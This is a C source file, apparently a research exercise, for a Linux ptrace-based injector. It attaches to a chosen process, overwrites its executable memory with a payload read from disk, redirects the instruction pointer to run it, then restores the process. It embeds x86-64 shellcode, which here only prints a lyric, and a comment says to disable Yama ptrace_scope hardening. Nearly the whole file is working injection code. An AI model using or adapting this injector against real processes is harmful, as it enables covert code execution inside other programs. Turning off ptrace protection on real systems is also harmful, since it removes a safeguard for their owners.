/*
	This code will serve as the "glue" that brings together all of the
		necessary functionality to inject code into a running process.

	CURRENT PLAN:
		1. Attach to the 'victim' process	
		2. Backup the current state of the processor registers
		3. Parse /proc/PID/maps to get some "r-xp" memory
		4. Backup the memory section
		5. Overwrite executable memory section
		6. Update RIP to point to the injected code
		7. Resume execution
		8. Wait until the injected code finishes running and hits a SIGTRAP
		9. Restore the process back to its original state

	NECESSARY PREPARATION:
		"ptrace() returned errno:	Operation not permitted"
			This is due to kernel hardening in Linux disable this behavior by:
				`echo 0 > /proc/sys/kernel/yama/ptrace_scope`
				modifying /etc/sysctl.d/10-ptrace.conf
 */

#include <errno.h>							// errno
#include "Fileroad.h"						// os_path_join(), fread_a_file()
#include "Harklerror.h"						// HARKLE_ERROR
#include "Harkleproc.h"						// is_it_a_PID(), make_PID_into_proc()
#include "Harkletrace.h"					// htrace_write_data()
#include "Map_Memory.h"						// mapMem_ptr
#include "Memoroad.h"						// release_a_string()
#include <sys/mman.h>						// mmap()
#include "pmparser.h"						// pmStruct_ptr
#include <signal.h>							// signals
#include <stdbool.h>						// bool, true, false
#include <stdio.h>							// fprintf()
#include <string.h>							// strcmp()
#include <sys/ptrace.h>						// ptrace()
#include <sys/syscall.h>					// syscall
#include <sys/user.h>						// struct user_regs_struct
#include <sys/wait.h>						// waitpid()


int main(int argc, char* argv[])
{
	// LOCAL VARIABLES
	bool success = true;  // Make this false if anything fails
	long ptRetVal = 0;  // ptrace() return value
	int errNum = 0;  // Store errno here
	pidDetails_ptr* procPIDStructs = parse_proc_PID_structs();
	pidDetails_ptr* temp_arr = procPIDStructs;
	pidDetails_ptr vicPID = NULL;  // Store the struct pointer for argv[1] here
	char* userProcPID = NULL;  // Will hold char* holding /proc/<PID>/ built from user's choice
	struct user_regs_struct oldRegs;  // Store the state of the registers here
	struct user_regs_struct newRegs;  // Modify the registers here
	pmStruct_ptr procMaps_ptr = NULL;  // /proc/PID/maps for argv[1]
	pmStruct_ptr tmpPM_ptr = NULL;  // Temporary variable to print out certain mappings
	struct iovec* localBackup = NULL;  // Local backup of the PIDs executable memory map
	char* payloadFilename = NULL;  // Store the payload absolute or relative filename here
	char* payloadContents = NULL;  // Store the contents of the payload here
	off_t payloadSize = 0;  // Store the length of the payload here
	int tempRetVal = 0;  // Store int return values here
	char code[] = { 0xEB, 0x11, 0x48, 0x31, 0xC0, 0xB0, 0x01, 0x48, 0x89, 0xC7, 0x5E, 0x48, 0x31, 0xD2, 0xB2, 0x29, \
	                0x0F, 0x05, 0xCC, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF, 0x54, 0x68, 0x61, 0x74, 0x20, 0x77, 0x65, 0x61, \
	                0x76, 0x65, 0x20, 0x67, 0x6F, 0x74, 0x74, 0x61, 0x20, 0x67, 0x6F, 0x2E, 0x20, 0x50, 0x69, 0x6E, \
	                0x6B, 0x20, 0x73, 0x6C, 0x69, 0x70, 0x2E, 0x20, 0x2D, 0x43, 0x61, 0x72, 0x64, 0x69, 0x20, 0x42, \
	                0x0A, 0x00 };
	char spinCode[5] = { 0x90, 0x90, 0x90, 0xEB, 0xFE };
	void* codeStart = NULL;  // Pointer to the beginning of the executable shell code
	size_t codeStartOffset = 0;  // Store the payload's offset of the nopnopnop here
	char nopCanary[3] = { 0x90, 0x90, 0x90 };  // Look for this nop slide in the shellcode
	mapMem_ptr mappedPayload = NULL;
	struct sigaction sigact;  // Used to specify actions for specific signals
	int sigNum = 1;  // Signal numbers to iterate through
	bool modifiedPerms = false;  // Set this to true if memory segment permissions were changed

	// INPUT VALIDATION
	// procPIDStructs
	if (!procPIDStructs)
	{
		HARKLE_ERROR(injector, main, parse_proc_PID_structs failed);
		success = false;
	}
	// Arguments
	if (argc < 2)
	{
		fprintf(stderr, "\nToo few arguments!\nusage: injector.exe <PID>\n\n");
		success = false;
	}
	else if (argc > 2)
	{
		fprintf(stderr, "\nToo many arguments!\nusage: injector.exe <PID>\n\n");
		success = false;
	}
	else if (false == is_it_a_PID(argv[1]))
	{
		fprintf(stderr, "\nInvalid PID!\nusage: injector.exe <PID>\nexample: injector.exe 1234\n\n");
		success = false;
	}
	else
	{
		// Create absolute path of PID
		userProcPID = make_PID_into_proc(argv[1]);

		if (!userProcPID)
		{
			HARKLE_ERROR(injector, main, make_PID_into_proc failed);
			success = false;
		}
		else
		{
			success = false;  // Set to true when PID match is found
			while (*temp_arr && success == false)
			{
				if (0 == strcmp((*temp_arr)->pidName, userProcPID) && (*temp_arr)->stillExists == true)
				{
					success = true;
					vicPID = *temp_arr;
					fprintf(stdout, "\nParsing %s (%s)\n", (*temp_arr)->pidName, (*temp_arr)->pidCmdline);
				}
				else
				{
					temp_arr++;
				}
			}

			if (success == false)
			{
				fprintf(stderr, "\nUnable to locate %s.\n\n", userProcPID);
			}
			else
			{
				fprintf(stdout, "[*] Located /proc/PID/\n");  // DEBUGGING
			}
		}
	}

	// SIGNAL HANDLER == IGNORE
	if (success == true)
	{
		sigemptyset(&sigact.sa_mask);  // Zeroize the mask of signals which should be blocked
		sigact.sa_flags = 0;  // Can't think of any good flags to add for what I'm doing
		sigact.sa_handler = SIG_IGN;  // Apparently, instead of handling the SIGNALS, we'll just ignore them

		// Set the action
		// rt_sigaction() doesn't work as (barely) documented
		// Reading sigaction() source code leads me to believe that rt_sigaction wants
		// 	SIGRTMAX / 8 as the fourth argument (NOT sizeof(sigset_t) like the man page says).
		// It works.  For more details, read:
		//	https://github.com/hark130/Latissimus_Dorsi/blob/practice/Research_Documents/3-4-1-rt_sigaction.txt
		if (-1 == syscall(SYS_rt_sigaction, SIGINT, &sigact, NULL, SIGRTMAX / 8))
		{
			errNum = errno;
			HARKLE_ERROR(nosig, main, syscall failed);
			HARKLE_ERRNO(nosig, SYS_rt_sigaction, errNum);
			success = false;
		}
	}

	// INJECTOR
	// 1. Attach to the 'victim' process
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_ATTACH, vicPID->pidNum, NULL, NULL);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_ATTACH failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			success = false;
		}
		else
		{
			// Wait for PID to stop
			if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
			{
				errNum = errno;
				HARKLE_ERROR(injector, main, waitpid failed);
				HARKLE_ERRNO(injector, waitpid, errNum);
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] Attched to PID\n");  // DEBUGGING
			}
		}
	}

	// 2. Backup the current state of the processor registers
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_GETREGS, vicPID->pidNum, NULL, &oldRegs);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_GETREGS failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Backed up PID's processor registers\n");  // DEBUGGING
			newRegs = oldRegs;  // Starting point for new register values
		}
	}

	// 3. Parse /proc/PID/maps to get some "r-xp" memory
	if (true == success)
	{
		// 3.1. /proc/PID/maps 
		procMaps_ptr = pmparser_parse(vicPID->pidNum);

		if (!procMaps_ptr)
		{
			HARKLE_ERROR(injector, main, pmparser_parse failed);
			success = false;
		}
		else
		{
			tmpPM_ptr = procMaps_ptr;
			tempRetVal = 0;  // TEST OTHER MEMORY SECTIONS
			while (tmpPM_ptr)
			{
				if (1 == tmpPM_ptr->is_x)
				{
					if (!tempRetVal)
					{
					    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
						break;  // Found one
					}
					else
					{
						tempRetVal--;
					}
				}

				tmpPM_ptr = tmpPM_ptr->next;
			}			
		}
	}

	// 4. Backup the memory section
	if (true == success)
	{
		localBackup = copy_remote_to_local(vicPID->pidNum, \
										   tmpPM_ptr->addr_start, \
										   (size_t)tmpPM_ptr->length);

		if (!localBackup)
		{
			HARKLE_ERROR(injector, main, copy_remote_to_local failed);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Successfully backed up PID memory\n");  // DEBUGGING
		}
	}
	
	// 5. Read in the payload
	if (true == success)
	{
		// 5.1 Determine payload location
		payloadFilename = os_path_join("./3-22-1_Payloads", "payload_64_write_1.o", true);		
		
		if (!payloadFilename)
		{
			HARKLE_ERROR(injector, main, os_path_join failed);
			success = false;
		}
		else
		{			
			// 5.2. Size the payload
			// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
			// payloadSize = size_a_file(payloadFilename, &tempRetVal);
			payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_1.o", &tempRetVal);
			
			if (-1 == payloadSize)
			{
				HARKLE_ERROR(injector, main, size_a_file failed);
				fprintf(stderr, "size_a_file() returned errno:\t%s\n", strerror(tempRetVal));
				success = false;
			}
			else
			{
				// 5.3. Read the payload in
				// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
				// payloadContents = fread_a_file(payloadFilename);
				payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");

				if (!payloadContents)
				{
					HARKLE_ERROR(injector, main, fread_a_file failed);
					success = false;
				}
			}
		}
	}

	// 6. Modify memory section permissions
	if (true == success)
	{
		// 6.1. Change the permissions on the memory
		// Current working theory... some Linux OSs won't permit mapped memory space
		//	to be rwxp.  If this is true, I'll have to flip permissions on the PID's
		//	memory space depending on what I want to do in that moment.
 		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
 		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
		// It's possible that some Linux implementations won't allow mapped memory space
		//	to contain both write *AND* execute permissions at the same time.
		tempRetVal = 0;
		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);
		// modifiedPerms = true;  // This will allow the "restore permissions" code block to execute
	}
	
	// 7. Overwrite memory section
	if (true == success)
	{
		tempRetVal = htrace_write_data(vicPID->pidNum, tmpPM_ptr->addr_start, payloadContents, payloadSize);

		if (tempRetVal)
		{
			HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
		}
	}

	// 8. Restore memory section permissions
	if (true == success && true == modifiedPerms)
	{
		// Change the permissions on the memory back to r-xp
		tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
									  MROAD_PROT_READ | MROAD_PROT_EXEC);

		if (tempRetVal)
		{
			HARKLE_ERROR(injector, main, change_mmap_prot failed);
			HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Restored mapped memory permissions (r-xp)\n");  // DEBUGGING
		}
	}

	// 9. Update RIP to point to the injected code
	if (true == success)
	{
		// 9.1. Find nopnopnop slide in the opcode
		codeStart = NULL;  // For safety
		codeStartOffset = pid_mem_hunt(vicPID->pidNum, (void*)tmpPM_ptr->addr_start, (void*)nopCanary, tmpPM_ptr->length, sizeof(nopCanary) / sizeof(*nopCanary));

		if (-1 == codeStartOffset)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt failed to find the nop slide);
			success = false;
		}
		else if (-2 == codeStartOffset)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt failed);
			success = false;
		}
		else if (codeStartOffset < 0)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt claimed success but returned a negative offset);
			success = false;
		}
		else
		{
			codeStart = tmpPM_ptr->addr_start + codeStartOffset;
		}

		if (!codeStart)
		{
			HARKLE_ERROR(injector, main, Failed to find the beginning of the shellcode);
			success = false;
		}
		else
		{
			// 9.2. Modify existing registers to reflect the new RIP
			newRegs.rip = (unsigned long long)codeStart + 2;  // Is RIP being decremented upon resume?!
			// newRegs.rip = (unsigned long long)codeStart;

			// 9.3. Update the victim PID's process registers
			ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &newRegs);

			if (-1 == ptRetVal)
			{
				errNum = errno;
				HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
				HARKLE_ERRNO(injector, ptrace, errNum);
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] Successfully updated RIP\n");  // DEBUGGING
			}
		}
	}

	// 10. Resume execution
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_CONT, vicPID->pidNum, NULL, NULL);
		
		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
		}
	}

	// 11. Wait until the injected code finishes running and hits a SIGTRAP
	if (true == success)
	{
		if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, waitpid failed);
			HARKLE_ERRNO(injector, waitpid, errNum);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] PID terminated\n");  // DEBUGGING
			
			if (WIFSTOPPED(errNum) && WSTOPSIG(errNum) == SIGTRAP)
			{
				fprintf(stdout, "[*] PID reached the SIGTRAP\n");  // DEBUGGING
			}
			else
			{
				HARKLE_ERROR(injector, main, SIGTRAP not found);
			}
		}
	}

	// 12. Restore the process back to its original state
 	if (true == success)
 	{
 		// 12.1. Restore the registers
 		ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &oldRegs);

 		if (-1 == ptRetVal)
 		{
 			errNum = errno;
 			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
 			success = false;
 		}
 		else
 		{
 			fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
 		}

		// 12.2. Change memory to write permissions
		if (true == success && true == modifiedPerms)
		{
			tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
										  MROAD_PROT_READ | MROAD_PROT_WRITE);

			if (tempRetVal)
			{
				HARKLE_ERROR(injector, main, change_mmap_prot failed);
				HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] REmodified mapped memory permissions (rw-p)\n");  // DEBUGGING
			}
		}
		
		// 12.3. Restore the mapped memory
		if (true == success)
		{
			htrace_write_data(vicPID->pidNum, (void*)tmpPM_ptr->addr_start, (void*)localBackup->iov_base, (int)localBackup->iov_len);
		}
		
		// 12.4. Change the permissions on the memory back to r-xp
		if (true == success && true == modifiedPerms)
		{
			tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
										  MROAD_PROT_READ | MROAD_PROT_EXEC);

			if (tempRetVal)
			{
				HARKLE_ERROR(injector, main, change_mmap_prot failed);
				HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] Restored mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
			}
		}
		
		// 12.4. Detach from the process to resume execution
		ptRetVal = ptrace(PTRACE_DETACH, vicPID->pidNum, NULL, NULL);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_DETACH failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] PID detached\n");  // DEBUGGING
		}
	}

	// CLEAN UP
	// 1. procPIDStructs
	if (procPIDStructs)
	{
		if (false == free_PID_struct_arr(&procPIDStructs))
		{
			HARKLE_ERROR(injector, main, free_PID_struct_arr failed);
		}
	}
	temp_arr = NULL;

	// 2. userProcPID
	if (userProcPID)
	{
		if (false == release_a_string(&userProcPID))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}

	// 3. 
	if (procMaps_ptr)
	{
		pmparser_free(procMaps_ptr);
		procMaps_ptr = NULL;
	}

	// 4. localBackup
	if (localBackup)
	{
		if (false == free_iovec_struct(&localBackup, true))
		{
			HARKLE_ERROR(injector, main, free_iovec_struct failed);
		}
	}
	
	// 5. payloadFilename
	if (payloadFilename)
	{
		if (false == release_a_string(&payloadFilename))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}
	
	// 6. payloadContents
	if (payloadContents)
	{
		if (false == release_a_string(&payloadContents))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}

	// 7. mappedPayload
	if (mappedPayload)
	{
		free_struct(&mappedPayload);
	}

	// DONE
	return 0;
}
